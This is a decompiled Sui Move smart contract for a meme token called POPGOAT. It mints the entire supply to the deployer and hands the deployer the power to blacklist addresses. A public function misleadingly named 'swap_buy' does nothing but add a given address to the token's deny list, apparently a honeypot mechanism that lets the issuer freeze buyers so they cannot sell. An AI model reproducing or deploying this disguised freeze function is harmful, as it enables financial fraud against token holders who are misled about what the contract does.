module 0x9c847b51a30edd9c456881f29ddcc59e9afbcdb987955031bff1a4fcc7bf6975::popgoat {
    struct POPGOAT has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: POPGOAT, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<POPGOAT>(arg0, 9, b"POPGOAT", b"Goatseus Poppimus", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmNZXG1NXMWGvZGh8GunqKGDmoPA2CLvqDQVk5pgJDrLXN"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<POPGOAT>(&mut v3, 1000000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<POPGOAT>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<POPGOAT>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<POPGOAT>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<POPGOAT>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<POPGOAT>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

